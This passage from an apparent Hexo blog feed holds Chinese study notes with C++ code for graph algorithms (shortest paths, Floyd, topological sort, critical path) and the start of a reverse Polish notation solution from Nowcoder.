class="hljs-keyword">final</span>[j]) &#123;<br>                weight[j] = min + amGraph.arcs[minSub][j];<br>                sub[j] = minSub;<br>            &#125;<br>        &#125;<br>  <br>    &#125;<br>  <br>  <br>    std::<span class="hljs-built_in">sort</span>(sub.<span class="hljs-built_in">begin</span>(), sub.<span class="hljs-built_in">end</span>(), [](<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b) &#123;<br>        <span class="hljs-keyword">return</span> a &lt; b;<br>    &#125;);<br>  <br>    std::cout&lt;&lt;<span class="hljs-string">&quot;\n\nthe shortest path:&quot;</span>&lt;&lt;std::endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        std::cout &lt;&lt; amGraph.vexs[sub[i]] &lt;&lt; <span class="hljs-string">&quot; --&gt; &quot;</span> &lt;&lt; amGraph.vexs[i] &lt;&lt; <span class="hljs-string">&quot;   now, the weight is: &quot;</span> &lt;&lt; weight[i]&lt;&lt;std::endl;<br>    &#125;<br>  <br>&#125;<br>  <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;<br>    <span class="hljs-type">int</span> size;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;please input size: &quot;</span>;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreatePairShortPath</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>弗洛伊德</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>    <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>    <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br>    <br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br>    <br>    <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs[i] = i + <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">//初始化，获得邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            std::cin &gt;&gt; amGraph.arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph.arcs[i][j] != MaxInt &amp;&amp; amGraph.arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatePairShortPath</span><span class="hljs-params">(AMGraph amGraph)</span> </span>&#123;<br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; weight;<br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; sub;<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; temSub;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; temWei;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            temWei.<span class="hljs-built_in">emplace_back</span>(amGraph.arcs[i][j]);<br>            temSub.<span class="hljs-built_in">emplace_back</span>(j);<br>        &#125;<br>        weight.<span class="hljs-built_in">emplace_back</span>(temWei);<br>        sub.<span class="hljs-built_in">emplace_back</span>(temSub);<br>    &#125;<br>    <br>    <span class="hljs-comment">//核心代码</span><br>    <span class="hljs-comment">//i:中间点</span><br>    <span class="hljs-comment">//j:出发点</span><br>    <span class="hljs-comment">//k:终点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; amGraph.vexnum; ++k) &#123;<br>                <span class="hljs-keyword">if</span> (weight[j][k] &gt; weight[j][i] + weight[i][k]) &#123;<br>                    weight[j][k] = weight[j][i] + weight[i][k];<br>                    sub[j][k] = sub[j][i];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//A-&gt;D</span><br>    <span class="hljs-type">int</span> beginSub = <span class="hljs-number">0</span>, endSub = <span class="hljs-number">3</span>;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;path: &quot;</span> &lt;&lt; amGraph.vexs[beginSub] &lt;&lt; <span class="hljs-string">&quot;  -&gt;  &quot;</span> &lt;&lt; amGraph.vexs[endSub] &lt;&lt; std::endl<br>              &lt;&lt; <span class="hljs-string">&quot; and the weight is &quot;</span> &lt;&lt; weight[beginSub][endSub] &lt;&lt; std::endl;<br>    <span class="hljs-type">int</span> kSub=sub[beginSub][endSub];<br>    std::cout&lt;&lt;amGraph.vexs[beginSub];<br>    <span class="hljs-keyword">while</span> (kSub != endSub) &#123;<br>        std::cout&lt;&lt;<span class="hljs-string">&quot; -&gt; &quot;</span>&lt;&lt;amGraph.vexs[kSub];<br>        kSub=sub[kSub][endSub];<br>    &#125;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot; -&gt; &quot;</span>&lt;&lt;amGraph.vexs[endSub]&lt;&lt;std::endl;<br>&#125;<br>    <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;<br>    <span class="hljs-type">int</span> size;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;please input size: &quot;</span>;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreatePairShortPath</span>(amGraph);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="有向无环图"><a href="#有向无环图" class="headerlink" title="有向无环图"></a>有向无环图</h2><ol><li><p><code>AOV</code>网 -&gt; 拓扑排序问题</p><p>使用一个有向图表示一个工程。定点表示活动 。使用弧长表示不同活动的先后关系</p></li><li><p><code>AOE</code>网 -&gt; 关键路径问题</p><p>使用弧表示活动，使用定点表示活动开始或者结束的事件</p></li></ol><h3 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h3><ol><li><p>用处：</p><p>所有的顶点都在拓扑序列当中则说明是没有环，反之有环</p></li><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;list&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stack&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    std::vector&lt;VerTexType&gt; vexs; <span class="hljs-comment">//顶点表</span><br>    std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; arcs; <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>    <span class="hljs-built_in">AMGraph</span>(<span class="hljs-type">int</span> vex, <span class="hljs-type">int</span> arc) : <span class="hljs-built_in">vexnum</span>(vex), <span class="hljs-built_in">arcnum</span>(arc) &#123;&#125;<br><br>    <span class="hljs-built_in">AMGraph</span>() : <span class="hljs-built_in">vexnum</span>(<span class="hljs-number">0</span>), <span class="hljs-built_in">arcnum</span>(<span class="hljs-number">0</span>) &#123;&#125;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Edge</span> &#123;<br>    VerTexType nextValue;<br>    <span class="hljs-type">int</span> sub;<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AdjacencyList</span> &#123;<br>    std::list&lt;std::shared_ptr&lt;Edge&gt;&gt; nextPoint;<br>    VerTexType vex;<br>    <span class="hljs-type">int</span> in;<br>    <span class="hljs-built_in">AdjacencyList</span>():<span class="hljs-built_in">vex</span>(<span class="hljs-string">&#x27;0&#x27;</span>),<span class="hljs-built_in">in</span>(<span class="hljs-number">0</span>)&#123;&#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreatGraph</span><span class="hljs-params">(AMGraph &amp;amGraph, <span class="hljs-type">int</span> &amp;num)</span> </span>&#123;<br>    amGraph.vexnum = num;<br>    <span class="hljs-comment">//给节点赋值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph.vexs.<span class="hljs-built_in">emplace_back</span>(i + <span class="hljs-string">&#x27;A&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        std::vector&lt;<span class="hljs-type">int</span>&gt; vec;<br>        amGraph.arcs.<span class="hljs-built_in">emplace_back</span>(vec);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            <span class="hljs-type">int</span> tem;<br>            std::cin &gt;&gt; tem;<br>            amGraph.arcs[i].<span class="hljs-built_in">emplace_back</span>(tem);<br>            <span class="hljs-keyword">if</span>(tem!=<span class="hljs-number">0</span>&amp;&amp;tem!=MaxInt)&#123;<br>                amGraph.arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CreateAdjacencyList</span><span class="hljs-params">(<span class="hljs-type">const</span> AMGraph &amp;amGraph, std::vector&lt;AdjacencyList&gt;&amp; adjacencyList)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        AdjacencyList tem;<br>        tem.vex=amGraph.vexs[i];<br>        adjacencyList.<span class="hljs-built_in">emplace_back</span>(tem);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(amGraph.arcs[i][j]!=<span class="hljs-number">0</span>&amp;&amp;amGraph.arcs[i][j]!=MaxInt)&#123;<br>                <span class="hljs-function">std::shared_ptr&lt;Edge&gt; <span class="hljs-title">pEdge</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Edge)</span></span>;<br>                pEdge-&gt;sub=j;<br>                pEdge-&gt;nextValue=amGraph.vexs[j];<br>                adjacencyList[i].nextPoint.<span class="hljs-built_in">push_back</span>(pEdge);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph.vexnum; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph.vexnum; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(amGraph.arcs[i][j]!=<span class="hljs-number">0</span>)&#123;  <br>                adjacencyList[j].in++;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SopologicalSort</span><span class="hljs-params">(std::vector&lt;AdjacencyList&gt;&amp; adjacencyLists)</span></span>&#123;<br>    std::stack&lt;AdjacencyList&gt; stack;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; adjacencyLists.<span class="hljs-built_in">size</span>(); ++i) &#123;<br>        <span class="hljs-keyword">if</span>(adjacencyLists[i].in==<span class="hljs-number">0</span>)&#123;<br>            stack.<span class="hljs-built_in">push</span>(adjacencyLists[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(!stack.<span class="hljs-built_in">empty</span>())&#123;<br>        <span class="hljs-keyword">auto</span> tem=stack.<span class="hljs-built_in">top</span>();<br>        std::cout&lt;&lt;tem.vex&lt;&lt;<span class="hljs-string">&quot;  &quot;</span>;<br>        i++;<br>        stack.<span class="hljs-built_in">pop</span>();<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;item:tem.nextPoint)&#123;<br>            <span class="hljs-keyword">if</span>(!--adjacencyLists[item-&gt;sub].in)&#123;<br>                stack.<span class="hljs-built_in">push</span>(adjacencyLists[item-&gt;sub]);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    std::cout&lt;&lt;std::endl&lt;&lt;<span class="hljs-string">&quot;size: &quot;</span>&lt;&lt;i&lt;&lt;std::endl;<br>    <span class="hljs-keyword">if</span>(i==adjacencyLists.<span class="hljs-built_in">size</span>())&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    AMGraph amGraph;  <span class="hljs-comment">//图，以及邻接矩阵</span><br>    std::vector&lt;AdjacencyList&gt; adjacencyList;<br>    <span class="hljs-type">int</span> size;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;input size: &quot;</span>&lt;&lt;std::endl;<br>    std::cin &gt;&gt; size;<br>    <span class="hljs-built_in">CreatGraph</span>(amGraph, size);<br>    <span class="hljs-built_in">CreateAdjacencyList</span>(amGraph,adjacencyList);<br>    std::cout&lt;&lt;<span class="hljs-built_in">SopologicalSort</span>(adjacencyList);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure></li></ol><h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><ol><li><p>结点</p><p><code>ve(i,j)</code>表示事件<code>i,j</code>最早发生的时间</p><p><code>vl(v,j)</code>表示事情最迟的发生时间</p></li><li><p>边</p><p><code>e(a3)</code>表示活动最早的开始时间</p><p><code>l(a3)</code>表示活动最迟的开始时间</p><p><code>l(a3)-e(a3)</code>表示完成 <code>a3</code>的时间余量</p><p>若<code>e()==i()</code>则说明是路径上关键活动</p></li><li><p>部分公式 </p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/%E5%85%B3%E9%94%AE%E8%B7%AF%E5%BE%84%E7%9A%84%E5%85%AC%E5%BC%8F.jpg"></p><p>活动<code>i</code>发生的最早时间，等于时间<code>j</code>的最晚发生时间</p><p>活动<code>i</code>最晚发生时间，等于<code>k</code>的最晚发生时间</p></li><li><p>求关键路径</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆波兰表达式求值</title>
    <link href="/2023/04/19/%E7%AE%97%E6%B3%95/newcoder/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/"/>
    <url>/2023/04/19/%E7%AE%97%E6%B3%95/newcoder/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/885c1db3e39040cbae5cdf59fb0e9382?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">逆波兰表达式求值_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC.png"></p><ol><li><p>代码</p><p>自己的版本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * @param tokens string字符串vector </span><br><span class="hljs-comment">     * @return int整型</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">evalRPN</span><span class="hljs-params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        stack&lt;<span class="hljs-type">int</span>&gt; stack;<br>        <span class="hljs-type">int</span> num;<br>        <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<span class="hljs-comment">//return</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item:tokens)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                num=std::<span class="hljs-built_in">stoi</span>(item.<span class="hljs-built_in">data</span>());<br>                stack.<span class="hljs-built_in">push</span>(num);<br>            &#125;<span class="hljs-built_in">catch</span> (...)&#123;<br>                <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;+&quot;</span>)&#123;<br>                    num=stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    sum=stack.<span class="hljs-built_in">top</span>()+num;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(sum);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;-&quot;</span>)&#123;<br>                    num=stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    sum=stack.<span class="hljs-built_in">top</span>()-num;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(sum);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;*&quot;</span>)&#123;<br>                    num=stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    sum=num*stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(sum);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;/&quot;</span>)&#123;<br>                    num=stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    sum=stack.<span class="hljs-built_in">top</span>()/num;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(sum);<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    cout&lt;&lt;<span class="hljs-string">&quot;input error&quot;</span>&lt;&lt;endl;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">top</span>();<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 存在的问题是，选择太太多了，代码冗长</span><br><span class="hljs-comment"> * try,catch的性能消耗过大</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>答案</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 